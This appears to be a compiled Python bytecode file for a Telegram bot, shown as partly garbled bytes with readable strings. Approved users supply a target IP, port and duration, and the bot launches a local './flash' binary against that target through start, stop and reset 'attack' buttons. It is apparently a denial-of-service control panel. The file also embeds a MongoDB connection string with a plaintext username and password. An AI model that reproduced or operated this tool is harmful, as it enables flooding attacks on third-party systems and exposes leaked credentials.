U
    �gV%  �                   @   sz  d dl Z d dlZd dlmZmZmZ d dlmZmZm	Z	m
Z
mZmZ d dlmZ d dlmZmZ dZee�ZejZejZejdejd� d	Zdadadadaeed
�dd�Z eed
�dd�Z!eej"d�dd�Z#eej"d�dd�Z$eej"d�dd�Z%eej"d�dd�Z&eej"d�dd�Z'eej"d�dd�Z(eej"d�dd�Z)eej"d�dd�Z*eej"d�d d!�Z+d"d#� Z,e-d$k�rve,�  dS )%�    N)�Update�InlineKeyboardButton�InlineKeyboardMarkup)�Application�CommandHandler�MessageHandler�CallbackQueryHandler�ContextTypes�filters)�MongoClient)�TOKEN�ADMIN_IDznmongodb+srv://patelji:pateljii@cluster0.f2bdi.mongodb.net/patelji?retryWrites=true&w=majority&appName=Cluster0z4%(asctime)s - %(name)s - %(levelname)s - %(message)s)�format�levelz./flash)�update�returnc                 C   s   | j d krdS | j jtkS )NF)�effective_user�idr   )r   � r   �flash.py�is_admin   s    
r   c                 C   s(   | j d krdS | j j}t�d|i�d k	S )NF�user_id)r   r   �approved_users_collection�find_one)r   r   r   r   r   �is_approved_user!   s    
r   �r   �contextc              	   �   s�   t | �s| j�d�I d H  d S zht|jd �}t�d|i�d krjt�d|i� | j�d|� d��I d H  n| j�d|� d��I d H  W n* tt	fk
r�   | j�d�I d H  Y nX d S )N�"This action is for admin use only.r   r   �User z- has been approved and added to the database.z is already approved.�Please provide a valid user ID.)
r   �message�
reply_text�int�argsr   r   Z
insert_one�
IndexError�
ValueError)r   r   r   r   r   r   �approve(   s    r&   c              	   �   s�   t | �s| j�d�I d H  d S z`t|jd �}t�d|i�}|jdkrb| j�d|� d��I d H  n| j�d|� d��I d H  W n* tt	fk
r�   | j�d�I d H  Y nX d S )Nr   r   r   r   z4 has been disapproved and removed from the database.z is not in the approved list.r   )
r   r    r!   r"   r#   r   Z
delete_oneZdeleted_countr$   r%   )r   r   r   �resultr   r   r   �
disapprove8   s    
r(   c                 �   sX   t | �s&t| �s&| j�d�I d H  d S tddd�gg}t|�}| jjd|d�I d H  d S )N�*This bot for admin and approved user only.u   🚀Attack🚀�attack�Zcallback_datauR   By @vdgaming2🚀Press the Attack button to start CHIN TAPAK DUM DUM (●'◡'●)��reply_markup)r   r   r    r!   r   r   )r   r   �keyboardr-   r   r   r   �startH   s    r/   c                 �   sh   | j }t| �s:t| �s:|j�d�I d H  |�� I d H  d S |�� I d H  |jdkrd|j�d�I d H  d S )Nr)   r*   ub   By @vdgaming2 Please enter the target, port, and time in the format:<target> <port> <time>🚀🚀)�callback_queryr   r   r    r!   �answer�data�r   r   Zqueryr   r   r   �button_handlerR   s    
r4   c                 �   s�   t | �s&t| �s&| j�d�I d H  d S z�| jj�� \}}}|at|�at|�a	t
ddd�gt
ddd�gt
ddd�gg}t|�}| jjd	t� d
t� dt	� d�|d�I d H  W n& tk
r�   | j�d�I d H  Y nX d S )Nr)   u   Start Attack🚀�start_attackr+   u   Stop Attack❌�stop_attacku   Reset Attack⚙️�reset_attackzTarget: z, Port: z, Time: z* seconds configured.
Now choose an action:r,   uK   Invalid format. Please enter in the format: 
<target> <port> <time>🚀🚀)r   r   r    r!   �text�split�	target_ipr"   �target_port�attack_timer   r   r%   )r   r   �targetZport�timer.   r-   r   r   r   �handle_input_   s$    ��r?   c              
   �   s  t | �s(t| �s(| jj�d�I d H  d S tr4tr4tsL| jj�d�I d H  d S trtt�	� d krt| jj�d�I d H  d S zPt
jtttt�tt�gt
jt
jd�a| jj�dt� dt� dt� d��I d H  W nN tk
�r } z.| jj�d	|� ��I d H  t�d	|� �� W 5 d }~X Y nX d S )
Nr)   z2Please configure the target, port, and time first.zAttack is already running.)�stdout�stderru    CHIN TAPAK DUM DUM(●'◡'●) �:z for z secondszError starting attack: )r   r   r0   r    r!   r:   r;   r<   �process�poll�
subprocess�Popen�BINARY_PATH�str�PIPE�	Exception�logging�error)r   r   �er   r   r   r5   {   s    $,r5   c                 �   sx   t | �s(t| �s(| jj�d�I d H  d S tr8t�� d k	rP| jj�d�I d H  d S t��  t��  | jj�d�I d H  d S )Nr)   u.   CHIN TAPAK DUM DUM NHI CHAL RHA (●'◡'●) zAttack stopped.)	r   r   r0   r    r!   rC   rD   �	terminate�waitr   r   r   r   r6   �   s    r6   c                 �   sl   t | �s(t| �s(| jj�d�I d H  d S trHt�� d krHt��  t��  d a	d a
d a| jj�d�I d H  d S )Nr)   ul   Attack reset. By @vdgaming2 Please enter the target, port, and time in the format:<target> <port> <time>🚀)r   r   r0   r    r!   rC   rD   rN   rO   r:   r;   r<   r   r   r   r   r7   �   s    r7   c                 �   s�   t | �s(t| �s(| jj�d�I d H  d S | j}|�� I d H  |jdkrXt| |�I d H  n6|jdkrtt| |�I d H  n|jdkr�t	| |�I d H  d S )Nr)   r5   r6   r7   )
r   r   r0   r    r!   r1   r2   r5   r6   r7   r3   r   r   r   �button_callback_handler�   s    


rP   c                  C   s�   t �� �t��� } | �tdt�� | �tdt�� | �tdt	�� | �t
tdd�� | �t
tdd�� | �ttjtj @ t�� | ��  d S )Nr/   r&   r(   z^attack$)�patternz)^(start_attack|stop_attack|reset_attack)$)r   Zbuilder�tokenr   ZbuildZadd_handlerr   r/   r&   r(   r   r4   rP   r   r
   ZTEXTZCOMMANDr?   Zrun_polling)Zapplicationr   r   r   �main�   s    rS   �__main__).rE   rK   Ztelegramr   r   r   Ztelegram.extr   r   r   r   r	   r
   Zpymongor   Zflashhr   r   Z	MONGO_URLZclientZpateljiZdbZapproved_usersr   ZbasicConfig�INFOrG   rC   r:   r;   r<   �boolr   r   ZDEFAULT_TYPEr&   r(   r/   r4   r?   r5   r6   r7   rP   rS   �__name__r   r   r   r   �<module>   s:    

